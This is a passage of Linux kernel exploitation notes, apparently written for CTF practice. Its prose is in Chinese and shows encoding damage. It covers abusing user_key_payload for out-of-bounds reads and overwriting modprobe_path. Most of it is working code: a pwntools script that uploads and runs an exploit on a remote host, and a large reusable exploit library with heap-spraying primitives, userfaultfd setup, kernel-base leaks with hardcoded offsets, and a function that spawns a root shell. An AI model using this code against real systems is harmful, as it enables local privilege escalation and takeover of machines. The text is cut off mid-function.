    ioctl(fd1,0x10001,0x400);
    close(fd1);
    int pipe_fd[2];
    pipe(pipe_fd);
    write(fd2,fake_pipe_buffer,0x20);
    close(pipe_fd[0]);
    close(pipe_fd[1]);
    close(fd2);
    return 0;
}
```



#### shm_file_data

#### msg_msg



#### user_key_payload

```c
#include <sys/types.h>
#include <keyutils.h>

key_serial_t add_key(const char *type, const char *description,const void *payload, size_t plen,key_serial_t keyring);
```

type ç”¨äºæŒ‡å®šå¯†é’¥çš„ç±»å‹ã€‚è¿™ä¸ªå‚æ•°å†³å®šäº†å¯†é’¥çš„ç”¨é€”å’Œè¡Œä¸ºã€‚å¸¸è§çš„ç±»å‹åŒ…æ‹¬ "user" å’Œ "keyring"
descriptionæ˜¯å¯†é’¥çš„æè¿°ã€‚è¿™æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œç”¨äºå”¯ä¸€æ ‡è¯†å¯†é’¥ã€‚ç³»ç»Ÿä¼šæ ¹æ®è¿™ä¸ªæè¿°æ¥åŒºåˆ†ä¸åŒçš„å¯†é’¥ã€‚
payload æ˜¯æŒ‡å‘åŒ…å«å¯†é’¥æ•°æ®çš„ç¼“å†²åŒºçš„æŒ‡é’ˆã€‚è¿™ä¸ªç¼“å†²åŒºåŒ…å«äº†å¯†é’¥çš„å®é™…å†…å®¹ã€‚
plen æ˜¯ç¼“å†²åŒºçš„å¤§å°ï¼Œä»¥å­—èŠ‚ä¸ºå•ä½
keyring æ˜¯å¯†é’¥ç¯çš„åºåˆ—å·ï¼ŒæŒ‡å®šè¯¥å¯†é’¥åº”è¯¥è¢«æ·»åŠ åˆ°å“ªä¸ªå¯†é’¥ç¯ä¸­ã€‚
å¯†é’¥ç¯æœ¬èº«ä¹Ÿæ˜¯ä¸€ç§ç‰¹æ®Šçš„å¯†é’¥ï¼Œå¯ä»¥åŒ…å«å…¶ä»–å¯†é’¥ã€‚

æ‰§è¡Œæµç¨‹ï¼š
é¦–å…ˆä¼šæ£€æµ‹å‚æ•°æ˜¯å¦æ­£ç¡®
åˆ†é…å¯¹è±¡obj1ï¼Œç”¨æ¥å­˜å‚¨å¯†é’¥æ•°æ®ã€‚åŒ…å«å¯†é’¥çš„typeã€descriptionã€æœ‰æ•ˆæœŸã€è®¿é—®æƒé™ä»¥åŠpayloadæŒ‡é’ˆ
å°†payloadæ‹·è´åˆ°obj2(plen)ä¸­
ç„¶åå°†å¯¹åº”çš„å†…å®¹å†æ¬¡æ‹·è´åˆ°obj3å’Œobj4(plen+0x18)ä¸­
é‡Šæ”¾obj1å’Œobj2
æ“ä½œå®Œæˆåï¼Œç³»ç»Ÿè¿”å›æ–°åˆ›å»ºçš„å¯†é’¥çš„å”¯ä¸€æ ‡è¯†ç¬¦ï¼ˆå¯†é’¥ IDï¼‰ã€‚è¿™ä¸ª ID å¯ç”¨äºåç»­æ“ä½œï¼Œå¦‚æŸ¥è¯¢ã€ä¿®æ”¹æˆ–åˆ é™¤å¯†é’¥ã€‚

æ‹·è´obj1å’Œobj2ï¼š
descriptionçš„æ‹·è´æ˜¯ä½¿ç”¨ strndup_user å‡½æ•°ä»ç”¨æˆ·ç©ºé—´å¤åˆ¶æè¿°å­—ç¬¦ä¸²åˆ°å†…æ ¸ç©ºé—´ï¼Œmemdup_user()ï¼Œkmalloc_track_callerå’Œcopy_from_user
payloadçš„æ‹·è´æ˜¯kvmalloc(plen, GFP_KERNEL) åˆ†é… plen å¤§å°çš„å¯¹è±¡åä½¿ç”¨ copy_from_user() è¿›è¡Œæ‹·è´
(obj1å’Œobj2æ˜¯ä¸´æ—¶å¯¹è±¡ï¼Œåœ¨ç³»ç»Ÿè°ƒç”¨ç»“æŸæ—¶ä¼šè¢«é‡Šæ”¾)

å…¶ä¸­ obj4 ä¸ºä¸€ä¸ª user_key_payload ç»“æ„ä½“ï¼Œæœ‰ç€ä¸€ä¸ªå›ºå®šå¤§å°çš„å¤´éƒ¨ï¼Œå…¶ä½™ç©ºé—´ç”¨æ¥å­˜å‚¨æ¥è‡ªç”¨æˆ·ç©ºé—´çš„æ•°æ®ï¼ˆå¯†é’¥å†…å®¹ï¼‰
```c
struct user_key_payload {
    struct rcu_head rcu;        /* RCU destructor */
    unsigned short  datalen;    /* length of this data */
    char        data[] __aligned(__alignof__(u64)); /* actual data */
};

//...

struct callback_head {
    struct callback_head *next;
    void (*func)(struct callback_head *head);
} __attribute__((aligned(sizeof(void *))));
#define rcu_head callback_head
```

keyctl() ç³»ç»Ÿè°ƒç”¨ä¸ºæˆ‘ä»¬æä¾›äº†è¯»å–ã€æ›´æ–°ï¼ˆåˆ†é…æ–°å¯¹è±¡ï¼Œé‡Šæ”¾æ—§å¯¹è±¡ï¼‰ã€é”€æ¯å¯†é’¥ï¼ˆé‡Šæ”¾ payloadï¼‰çš„åŠŸèƒ½ï¼Œå…¶ä¸­è¯»å–çš„æœ€å¤§é•¿åº¦ç”± user_key_payload->datalen å†³å®š
å¯ä»¥åˆ©ç”¨é¢˜ç›®æä¾›çš„ UAF å°†user_key_payload->datalen æ”¹å¤§ï¼Œä»è€Œå®Œæˆè¶Šç•Œè¯»ã€‚



#### modprobe_path

```shell
# æ™®é€šæƒé™å³å¯ä¿®æ”¹è¯¥å€¼,å¹¶ä¸”è¯¥ç¨‹åºå…·æœ‰rootæƒé™
cat /proc/sys/kernel/modprobe
-> /sbin/modprobe
```

å½“å†…æ ¸è¿è¡Œä¸€ä¸ªé”™è¯¯æ ¼å¼çš„æ–‡ä»¶ï¼ˆæˆ–æœªçŸ¥æ–‡ä»¶ç±»å‹çš„æ–‡ä»¶ï¼‰çš„æ—¶å€™ï¼Œå°±ä¼šè°ƒç”¨è¿™ä¸ªç¨‹åº
```
ï¼ˆ1ï¼‰do_execve()
ï¼ˆ2ï¼‰do_execveat_common()
ï¼ˆ3ï¼‰bprm_execve()
ï¼ˆ4ï¼‰exec_binprm()
ï¼ˆ5ï¼‰search_binary_handler()
ï¼ˆ6ï¼‰request_module()
ï¼ˆ7ï¼‰call_usermodehelper() -> /sbin/modprobe
```

2017å¹´ä»linux4.11å¼€å§‹å°±æå‡ºäº†CONFIG_STATIC_USERMODEHELPERæ¥é˜²æ­¢modprobe_pathè¢«æ”¹
æ‰€ä»¥è¦ä¿è¯CONFIG_STATIC_USERMODEHELPERæœªå¯ç”¨

```shell
# å…¶å®æ²¡æ³•ç›´æ¥åˆ¤æ–­æ˜¯å¦å¼€å¯
grep CONFIG_STATIC_USERMODEHELPER /boot/config-$(uname -r)
```
















### æ‚è°ˆ

```shell
# attack.sh
#!/bin/sh
gcc exp.c -static -masm=intel -g -o exp
cp exp core/exp
cd core
hen core.cpio
cd ..
./start.sh
```







```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import os

context.arch = "amd64"
context.log_level = 'debug'
cmd = '$ '


def exploit(r):
    r.sendlineafter(cmd, 'stty -echo')
    os.system('gzip -c ./exp > ./exp.gz')
    r.sendlineafter(cmd, 'cat <<EOF > /tmp/exp.gz.b64')
    r.sendline((read('./exp.gz')).encode('base64'))
    r.sendline('EOF')
    r.sendlineafter(cmd, 'base64 -d /tmp/exp.gz.b64 > /tmp/exp.gz')
    r.sendlineafter(cmd, 'gunzip /tmp/exp.gz')
    r.sendlineafter(cmd, 'chmod +x /tmp/exp')
    r.sendlineafter(cmd, "/tmp/exp")
    r.interactive()

if (len(sys.argv) != 3):
    print("python exp.py ip port")
    exit(0)

p = remote(sys.argv[1],sys.argv[2])
exploit(p)
```



exp

æ¿å­

```c
# banzi.h
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <assert.h>
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <keyutils.h>
#include <linux/userfaultfd.h>
#include <poll.h>
#include <pthread.h>
#include <signal.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/shm.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/xattr.h>
#include <unistd.h>
#include <linux/genetlink.h>
#include <linux/if_packet.h>
#include <linux/netlink.h>
#include <linux/openvswitch.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <sched.h>
#include <stdint.h>
#include <sys/utsname.h>
// #define DEBUG 1
#define COLOR_GREEN "\033[32m"
#define COLOR_RED "\033[31m"
#define COLOR_YELLOW "\033[33m"
#define COLOR_DEFAULT "\033[0m"
#define ELEM_CNT(x) (sizeof(x) / sizeof(x[0]))
#define SYS_SETRESUID_OFFSET (0xd81d0)
#define PREFIX_BUF_LEN (16)
#define logd(fmt, ...) dprintf(2, "[*] %s:%d " fmt "\n", __FILE__, __LINE__, ##__VA_ARGS__)
#define logi(fmt, ...) dprintf(2, COLOR_GREEN "[+] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)
#define logw(fmt, ...) dprintf(2, COLOR_YELLOW "[!] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)
#define loge(fmt, ...) dprintf(2, COLOR_RED "[-] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)
#define die(fmt, ...)                      \
    do {                                   \
        loge(fmt, ##__VA_ARGS__);          \
        loge("Exit at line %d", __LINE__); \
        write(sync_pipe[1], "F", 1);       \
        exit(1);                           \
    } while (0)

int sync_pipe[2];
#ifdef DEBUG
#define debug(...) printf(__VA_ARGS__)
#else
#define debug(...) do {} while (0)
#endif

#define HEAP_MASK 0xffff000000000000
#define KERNEL_MASK 0xffffffff00000000

#define PAGE_SIZE 4096
#define MAX_KEYS 199
#define N_STACK_PPS 30
#define POLLFD_PER_PAGE 510
#define POLL_LIST_SIZE 16
#define NFDS(size) (((size - POLL_LIST_SIZE) / sizeof(struct pollfd)) + N_STACK_PPS);
pthread_t poll_tid[0x1000];
size_t poll_threads;
pthread_mutex_t mutex;
uint64_t usr_cs, usr_ss, usr_rflags;
uint64_t proc_single_show;
uint64_t target_object;
uint64_t kernel_base;

int pipes[0x1000][2];
int seq_ops[0x10000];
int ptmx[0x1000];
int fds[0x1000];
int keys[0x1000];
int corrupted_key;
int n_keys;
int fd;
int s;


struct t_args
{
    int id;
    int nfds;
    int timer;
    bool suspend;
};


struct rcu_head
{
    void *next;
    void *func;
};


struct user_key_payload
{
    struct rcu_head rcu;
    unsigned short	datalen;
    char *data[];
};
void init_namespace(void);
void set_cpu_affinity(int cpu_n, pid_t pid);
void packet_socket_rx_ring_init(int s, unsigned int block_size,
                                unsigned int frame_size, unsigned int block_nr,
                                unsigned int sizeof_priv, unsigned int timeout);


int packet_socket_setup(unsigned int block_size, unsigned int frame_size,
                        unsigned int block_nr, unsigned int sizeof_priv, int timeout);

int pagealloc_pad(int size, int count);

struct poll_list
{
    struct poll_list *next;
    int len;
    struct pollfd entries[];
};



bool is_kernel_pointer(uint64_t addr);


bool is_heap_pointer(uint64_t addr);


void __pause(char *msg);


void save_state();
int randint(int min, int max);
void assign_to_core(int core_id);
void assign_thread_to_core(int core_id);
void init_fd(int i);
void *alloc_poll_list(void *args);
void create_poll_thread(int id, size_t size, int timer, bool suspend);
void join_poll_threads(void);
int alloc_key(int id, char *buff, size_t size);
void free_key(int i);
void free_all_keys(bool skip_corrupted_key);
char *get_key(int i, size_t size);
void alloc_pipe_buff(int i);
void release_pipe_buff(int i);
void alloc_tty(int i);
void free_tty(int i);
void alloc_seq_ops(int i);
void free_seq_ops(int i);
int leak_kernel_pointer(int kid);
int leak_heap_pointer(int kid);
bool check_root();
// typedef struct
// {
//     int64_t idx;
//     uint64_t size;
//     char *buf;    
// }user_req_t;

// struct tpacket_req {
//     unsigned int    tp_block_size;
//     unsigned int    tp_block_nr;
//     unsigned int    tp_frame_size;
//     unsigned int    tp_frame_nr;
// };

// enum tpacket_versions {
//     TPACKET_V1,
//     TPACKET_V2,
//     TPACKET_V3,
// };
// #define PACKET_VERSION 10
// #define PACKET_TX_RING 13
#define ISO_SLAB_LIMIT 8
#define INITIAL_PAGE_SPRAY 500
typedef struct
{
    bool in_use;
    int idx[ISO_SLAB_LIMIT];
}full_page;

enum spray_cmd {
    ALLOC_PAGE,
    FREE_PAGE,
    EXIT_SPRAY,
};

// typedef struct
// {
//     enum spray_cmd cmd;
//     int32_t idx;
//     int32_t size;
//     int32_t n;
// }ipc_req_t;

int shmid[0x1000];
void *shmaddr[0x1000];

void alloc_shm(int i);
int rootfd[2];
int sprayfd_child[2];
int sprayfd_parent[2];
// int socketfds[INITIAL_PAGE_SPRAY];
// int alloc_pages_via_sock(uint32_t size, uint32_t n);

// void spray_comm_handler();

// void send_spray_cmd(enum spray_cmd cmd, int idx,int n);
// void unshare_setup(uid_t uid, gid_t gid);
void errExit(char *msg);
void registerUserfault(void *fault_page,void *handler);

int spray_sendmsg(char *buf,int size,int count);
void hexdump(unsigned char *buff, size_t size);
struct msg_msg {
  uint64_t m_list_next;
  uint64_t m_list_prev;
  uint64_t m_type;
  uint64_t m_ts;
  uint64_t next;
  uint64_t security;
};

struct msg_msgseg {
  uint64_t next;
};
struct {
  long mtype;
  char mtext[0x4000];
} msgbuf;
int msgqid[0x10000];
int add_msg(int msqid, const void *msgp, size_t msgsz);

int show_msg(int msqid, void *msgp,size_t msgsz,long msgtyp);

int free_msg(int msqid, void *msgp, size_t msgsz, long msgtyp);
int msg_get();
void build_msg_msg(struct msg_msg *msg, uint64_t m_list_next,
                   uint64_t m_list_prev, uint64_t m_type,uint64_t m_ts, uint64_t next);
void build_msg(int num);
```



```c
# banzi.c
#include "banzi.h"

void init_namespace(void) {
    int fd;
    char buff[0x100];

    uid_t uid = getuid();
    gid_t gid = getgid();

    if (unshare(CLONE_NEWUSER | CLONE_NEWNS)) {
        die("unshare(CLONE_NEWUSER | CLONE_NEWNS): %m");
    }

    if (unshare(CLONE_NEWNET)) {
        die("unshare(CLONE_NEWNET): %m");
    }

    fd = open("/proc/self/setgroups", O_WRONLY);
    snprintf(buff, sizeof(buff), "deny");
    write(fd, buff, strlen(buff));
    close(fd);

    fd = open("/proc/self/uid_map", O_WRONLY);
    snprintf(buff, sizeof(buff), "0 %d 1", uid);
    write(fd, buff, strlen(buff));
    close(fd);

    fd = open("/proc/self/gid_map", O_WRONLY);
    snprintf(buff, sizeof(buff), "0 %d 1", gid);
    write(fd, buff, strlen(buff));
    close(fd);
}

void set_cpu_affinity(int cpu_n, pid_t pid) {
    cpu_set_t set;

    CPU_ZERO(&set);
    CPU_SET(cpu_n, &set);

    if (sched_setaffinity(pid, sizeof(set), &set) < 0) {
        die("sched_setaffinity: %m");
    }
}

void packet_socket_rx_ring_init(int s, unsigned int block_size,
                                unsigned int frame_size, unsigned int block_nr,
                                unsigned int sizeof_priv, unsigned int timeout) {
    int v = TPACKET_V3;
    int rv = setsockopt(s, SOL_PACKET, PACKET_VERSION, &v, sizeof(v));
    if (rv < 0) {
        die("setsockopt(PACKET_VERSION): %m");
    }

    struct tpacket_req3 req;
    memset(&req, 0, sizeof(req));
    req.tp_block_size = block_size;
    req.tp_frame_size = frame_size;
    req.tp_block_nr = block_nr;
    req.tp_frame_nr = (block_size * block_nr) / frame_size;
    req.tp_retire_blk_tov = timeout;
    req.tp_sizeof_priv = sizeof_priv;
    req.tp_feature_req_word = 0;

    rv = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req));
    if (rv < 0) {
        die("setsockopt(PACKET_RX_RING): %m");
    }
}

int packet_socket_setup(unsigned int block_size, unsigned int frame_size,
                        unsigned int block_nr, unsigned int sizeof_priv, int timeout) {
    int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (s < 0) {
        die("socket(AF_PACKET): %m");
    }

    packet_socket_rx_ring_init(s, block_size, frame_size, block_nr,
                               sizeof_priv, timeout);

    struct sockaddr_ll sa;
    memset(&sa, 0, sizeof(sa));
    sa.sll_family = PF_PACKET;
    sa.sll_protocol = htons(ETH_P_ALL);
    sa.sll_ifindex = if_nametoindex("lo");
    sa.sll_hatype = 0;
    sa.sll_pkttype = 0;
    sa.sll_halen = 0;

    int rv = bind(s, (struct sockaddr *)&sa, sizeof(sa));
    if (rv < 0) {
        die("bind(AF_PACKET): %m");
    }

    return s;
}

int pagealloc_pad(int size, int count) {
    return packet_socket_setup(size, 2048, count, 0, 100);
}

pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
int add_msg(int msqid, const void *msgp, size_t msgsz) {
	if (msgsnd(msqid, msgp, msgsz, 0) < 0) {
		perror("[-] msgsnd");
    	return -1;
    }
    return 0;
}
void alloc_shm(int i) {
    shmid[i] = shmget(IPC_PRIVATE, 0x1000, IPC_CREAT | 0600);

    if (shmid[i] < 0) {
        perror("[X] shmget fail");
        exit(1);
    }

    shmaddr[i] = (void *)shmat(shmid[i], NULL, SHM_RDONLY);

    if (shmaddr[i] < 0) {
        perror("[X] shmat");
        exit(1);
    }
}
int show_msg(int msqid, void *msgp,size_t msgsz,long msgtyp) {
    if (msgrcv(msqid, msgp, msgsz, msgtyp, MSG_COPY | IPC_NOWAIT) < 0) {
        perror("[-] msgrcv");
        return -1;
    }
    return 0;
}

int free_msg(int msqid, void *msgp, size_t msgsz, long msgtyp) {
    if (msgrcv(msqid, msgp, msgsz, msgtyp, 0) < 0) {
        perror("[-] msgrcv");
        return -1;
    }
    return 0;
}
int msg_get(){
    int pid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    if(pid < 0){
        perror("msgget");
        return -1;
    }
    return pid;
}
void build_msg_msg(struct msg_msg *msg, uint64_t m_list_next,
                   uint64_t m_list_prev, uint64_t m_type,uint64_t m_ts, uint64_t next) {
  msg->m_list_next = m_list_next;
  msg->m_list_prev = m_list_prev;
  msg->m_type = m_type;
  msg->m_ts = m_ts;
  msg->next = next;
  msg->security = 0;
}
void build_msg(int num){
	for(int i = 0;i < num;i++){
		msgqid[i] = msg_get();
	}
}
int spray_sendmsg(char *buf,int size,int count){
    // char buf[size];
    struct msghdr msgh = {0};
    struct sockaddr_in addr = {0};
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    addr.sin_family = AF_INET;
    addr.sin_port = htons(6666);
 
    // filled with 0x61 'a'
    // memset(buf,'\x00',sizeof(buf));
    // *(uint64_t*)(buf + 8*2) = 0xfff0;
    // *(uint64_t*)(buf + 8*3) = 0xdeadbeef;
    // set user space buf(msg header)
    msgh.msg_control = buf;
    msgh.msg_controllen = size;
    msgh.msg_name = (caddr_t)&addr;
    msgh.msg_namelen = sizeof(addr);
    for(int i = 0;i < count;i++){
      sendmsg(sockfd, &msgh, 0);
    }
}
void registerUserfault(void *fault_page,void *handler)
{
   pthread_t thr;
   struct uffdio_api ua;
   struct uffdio_register ur;
   uint64_t uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
   ua.api = UFFD_API;
   ua.features    = 0;
   if (ioctl(uffd, UFFDIO_API, &ua) == -1)
      errExit("[-] ioctl-UFFDIO_API");
 
   ur.range.start = (unsigned long)fault_page;
   ur.range.len   = PAGE_SIZE;
   ur.mode        = UFFDIO_REGISTER_MODE_MISSING;
   if (ioctl(uffd, UFFDIO_REGISTER, &ur) == -1)
      errExit("[-] ioctl-UFFDIO_REGISTER");
   int s = pthread_create(&thr, NULL,handler, (void*)uffd);
   if (s!=0)
      errExit("[-] pthread_create");
}
void errExit(char *msg) {
   puts(msg);
   _exit(-1);
}
// int alloc_pages_via_sock(uint32_t size, uint32_t n)
// {
//     struct tpacket_req req;
//     int32_t socketfd, version;

//     socketfd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);
//     if (socketfd < 0)
//     {
//         perror("bad socket");
//         exit(-1);
//     }

//     version = TPACKET_V1;

//     if (setsockopt(socketfd, SOL_PACKET, PACKET_VERSION, &version, sizeof(version)) < 0)
//     {
//         perror("setsockopt PACKET_VERSION failed");
//         exit(-1);
//     }

//     assert(size % 4096 == 0);

//     memset(&req, 0, sizeof(req));

//     req.tp_block_size = size;
//     req.tp_block_nr = n;
//     req.tp_frame_size = 4096;
//     req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;

//     if (setsockopt(socketfd, SOL_PACKET, PACKET_TX_RING, &req, sizeof(req)) < 0)
//     {
//         perror("setsockopt PACKET_TX_RING failed");
//         exit(-1);
//     }

//     return socketfd;
// }

// void spray_comm_handler()
// {
//     ipc_req_t req;
//     int32_t result;

//     do {
//         read(sprayfd_child[0], &req, sizeof(req));
//         assert(req.idx < INITIAL_PAGE_SPRAY);
//         if (req.cmd == ALLOC_PAGE)
//         {
//             socketfds[req.idx] = alloc_pages_via_sock(4096, req.n);
//             printf("%llx\n",socketfds[0]);
//         }
//         else if (req.cmd == FREE_PAGE)
//         {
//             close(socketfds[req.idx]);
//         }
//         result = req.idx;
//         write(sprayfd_parent[1], &result, sizeof(result));
//     } while(req.cmd != EXIT_SPRAY);

// }

// void send_spray_cmd(enum spray_cmd cmd, int idx,int n)
// {
//     ipc_req_t req;
//     int32_t result;

//     req.cmd = cmd;
//     req.idx = idx;
//     req.n = n;
//     write(sprayfd_child[1], &req, sizeof(req));
//     read(sprayfd_parent[0], &result, sizeof(result));
//     assert(result == idx);
// }
// void unshare_setup(uid_t uid, gid_t gid)
// {
//     int temp;
//     char edit[0x100];
//     unshare(CLONE_NEWNS|CLONE_NEWUSER|CLONE_NEWNET);
//     temp = open("/proc/self/setgroups", O_WRONLY);
//     write(temp, "deny", strlen("deny"));
//     close(temp);
//     temp = open("/proc/self/uid_map", O_WRONLY);
//     snprintf(edit, sizeof(edit), "0 %d 1", uid);
//     write(temp, edit, strlen(edit));
//     close(temp);
//     temp = open("/proc/self/gid_map", O_WRONLY);
//     snprintf(edit, sizeof(edit), "0 %d 1", gid);
//     write(temp, edit, strlen(edit));
//     close(temp);
//     return;
// }
void win(void)
{
    if (check_root())
    {
        puts("[+] We are Ro0ot!");
        char *args[] = { "/bin/bash", "-i", NULL };
        execve(args[0], args, NULL);
    }
}
bool is_kernel_pointer(uint64_t addr)
{
    return ((addr & KERNEL_MASK) == KERNEL_MASK) ? true : false;
}


bool is_heap_pointer(uint64_t addr)
{
    return (((addr & HEAP_MASK) == HEAP_MASK) && !is_kernel_pointer(addr)) ? true : false;
}


void __pause(char *msg)
{
    printf("[-] Paused - %s\n", msg);
    getchar();
}


void save_state()
{
    __asm__ __volatile__(
        "movq %0, cs;"
        "movq %1, ss;"
        "pushfq;"
        "popq %2;"
        : "=r" (usr_cs), "=r" (usr_ss), "=r" (usr_rflags) : : "memory" );
}


int randint(int min, int max)
{
    return min + (rand() % (max - min));
}


void assign_to_core(int core_id)
{
    cpu_set_t mask;

    CPU_ZERO(&mask);
    CPU_SET(core_id, &mask);

    if (sched_setaffinity(getpid(), sizeof(mask), &mask) < 0)
    {
        perror("[X] sched_setaffinity()");
        exit(1);
    }
}

void hexdump(unsigned char *buff, size_t size) {
    int i, j;

    for (i = 0; i < size / 8; i++) {
        if ((i % 2) == 0) {
            if (i != 0) printf("  \n");

            printf("  %04x  ", i * 8);
        }

        printf("0x%016lx", ((uint64_t *)(buff))[i]);
        printf("    ");
    }

    putchar('\n');
}

void assign_thread_to_core(int core_id)
{
    cpu_set_t mask;

    CPU_ZERO(&mask);
    CPU_SET(core_id, &mask);

    if (pthread_setaffinity_np(pthread_self(), sizeof(mask), &mask) < 0)
    {
        perror("[X] assign_thread_to_core_range()");
        exit(1);
    }
}


void init_fd(int i)
{
    fds[i] = open("/etc/passwd", O_RDONLY);

    if (fds[i] < 1)
    {
        perror("[X] init_fd()");
        exit(1);
    }
}


void *alloc_poll_list(void *args)
{
    struct pollfd *pfds;
    int nfds, timer, id;
    bool suspend;

    id    = ((struct t_args *)args)->id;
    nfds  = ((struct t_args *)args)->nfds;
    timer = ((struct t_args *)args)->timer;
    suspend = ((struct t_args *)args)->suspend;

    pfds = calloc(nfds, sizeof(struct pollfd));

    for (int i = 0; i < nfds; i++)
    {
        pfds[i].fd = fds[0];
        pfds[i].events = POLLERR;
    }

    assign_thread_to_core(0);

    pthread_mutex_lock(&mutex);
    poll_threads++;
    pthread_mutex_unlock(&mutex);

    debug("[Thread %d] Start polling...\n", id);
    int ret = poll(pfds, nfds, timer);
    debug("[Thread %d] Polling complete: %d!\n", id, ret);
    
    assign_thread_to_core(randint(1, 3));

    if (suspend)
    {   
        debug("[Thread %d] Suspending thread...\n", id);

        pthread_mutex_lock(&mutex);
        poll_threads--;
        pthread_mutex_unlock(&mutex);

        while (1) { };
    }
        
}


void create_poll_thread(int id, size_t size, int timer, bool suspend)
{
    struct t_args *args;

    args = calloc(1, sizeof(struct t_args));

    if (size > PAGE_SIZE)
        size = size - ((size/PAGE_SIZE) * sizeof(struct poll_list));

    args->id = id;
    args->nfds = NFDS(size);
    args->timer = timer;
    args->suspend = suspend;

    pthread_create(&poll_tid[id], 0, alloc_poll_list, (void *)args);
}


void join_poll_threads(void)
{
    for (int i = 0; i < poll_threads; i++)
    {
        pthread_join(poll_tid[i], NULL);
        // open("/proc/self/stat", O_RDONLY);
    }
        
    poll_threads = 0;
}


int alloc_key(int id, char *buff, size_t size)
{
	char desc[256] = { 0 };
    char *payload;
    int key;

    size -= sizeof(struct user_key_payload);

    sprintf(desc, "payload_%d", id);

    payload = buff ? buff : calloc(1, size);

    if (!buff)
        memset(payload, id, size);    

    key = add_key("user", desc, payload, size, KEY_SPEC_PROCESS_KEYRING);

    if (key < 0)
	{
		perror("[X] add_key()");
		return -1;
	}
    	
    return key;
}


void free_key(int i)
{
    if(!keys[i]) puts("Invalid keys[i]");
	
    if(keyctl_revoke(keys[i]) < 0 || keyctl_unlink(keys[i], KEY_SPEC_PROCESS_KEYRING) < 0){
        printf("keys[%d]\n ",i);
        perror("=> ");
        // printf("%d\n")
        return -1;
    }
	
    // n_keys--;
}
void revoke_key(int i)
{
    if(!keys[i]) puts("Invalid keys[i]");
	if(keyctl(KEYCTL_REVOKE, keys[i], 0, 0, 0) < 0){
        printf("keys[%d] ",i);
        perror("=> ");
        return -1;
    }
	// keyctl_unlink(keys[i], KEY_SPEC_PROCESS_KEYRING);
    // n_keys--;
}


void free_all_keys(bool skip_corrupted_key)
{
    for (int i = 0; i < n_keys; i++)
    {   
        if (skip_corrupted_key && i == corrupted_key)
            continue;

        free_key(i);
    }

    sleep(1); // GC keys
}


char *get_key(int i, size_t size)
{
	char *data;

	data = calloc(1, size);
	keyctl_read(keys[i], data, size);
    // printf("%s\n",data);
	return data;
}


void alloc_pipe_buff(int i)
{
    if (pipe(pipes[i]) < 0)
    {
        perror("[X] alloc_pipe_buff()");
        return;
    }

    // if (write(pipes[i][1], "XXXXX", 5) < 0)
    // {
    //     perror("[X] alloc_pipe_buff()");
    //     return;
    // }
}


void release_pipe_buff(int i)
{
    if (close(pipes[i][0]) < 0)
    {
        perror("[X] release_pipe_buff()");
        return;
    }

    if (close(pipes[i][1]) < 0)
    {
        perror("[X] release_pipe_buff()");
        return;
    }
}


void alloc_tty(int i)
{
    ptmx[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);

    if (ptmx[i] < 0)
    {
        perror("[X] alloc_tty()");
        exit(1);
    }
}


void free_tty(int i)
{
    close(ptmx[i]);
}


void alloc_seq_ops(int i)
{
    seq_ops[i] = open("/proc/self/stat", O_RDONLY);

    if (seq_ops[i] < 0)
    {
        perror("[X] spray_seq_ops()");
        exit(1);
    }
}


void free_seq_ops(int i)
{
    close(seq_ops[i]);
}


int leak_kernel_pointer(int kid)
{
    uint64_t *leak;
    char *key;

    key = get_key(kid, 0xfff0);
    leak = (uint64_t *)key;

    // if (is_kernel_pointer(*leak) && (*leak & 0xfff) == 0x520)
    // {
    //     // corrupted_key = i;
    //     // proc_single_show = *leak;
    //     // kernel_base = proc_single_show - 0xffffffff813275c0;

    //     // printf("[+] Corrupted key found: keys[%d]!\n", corrupted_key);
    //     // printf("[+] Leaked proc_single_show address: 0x%llx\n", proc_single_show);
    //     // printf("[+] Kernel base address: 0x%llx\n", kernel_base + 0xffffffff00000000);
    //     kernel_base = 
        
    //     return 0;
    // }
    for (int i = 0; i < 0xfff0/sizeof(uint64_t); i++)
    {
        // if(is_heap_pointer(leak[i])){
        //     printf("heap_%d ==> 0x%llx\n",i,leak[i]);
        // }
        if (is_kernel_pointer(leak[i]) && (leak[i] & 0xfff) == 0x520)
        {   
            // if (leak[i + 2] == leak[i + 3] && leak[i + 2] != 0)
            // {
            //     target_object = leak[i];
            //     logi("Leaked kmalloc-1024 object: 0x%llx\n", target_object);
            //     return 0;
            // }
            uint64_t kernel_base1 = leak[i] - 0x1ab2520;
            logi("get kernel_base: 0x%llx",kernel_base1);
            return kernel_base1;
        }
    }

    return -1;
}


int leak_heap_pointer(int kid)
{
    uint64_t *leak;
    char *key;

    key = get_key(kid, 0xfff0);
    // hexdump(key,0x100);
    leak = (uint64_t *)key;

    for (int i = 0; i < 0xfff0/sizeof(uint64_t); i++)
    {
        // if(is_heap_pointer(leak[i])){
        //     printf("heap_%d ==> 0x%llx\n",i,leak[i]);
        // }
        if (is_heap_pointer(leak[i]) && (leak[i] & 0xff) == 0x00)
        {   
            if (leak[i + 2] == leak[i + 3] && leak[i + 2] != 0)
            {
                target_object = leak[i];
                logi("Leaked kmalloc-1024 object: 0x%llx", target_object);
                return 0;
            }
        }
    }

    return -1;
}


bool check_root()
{
	int fd;
    
    if ((fd = open("/etc/shadow", O_RDONLY)) < 0)
        return false;
        
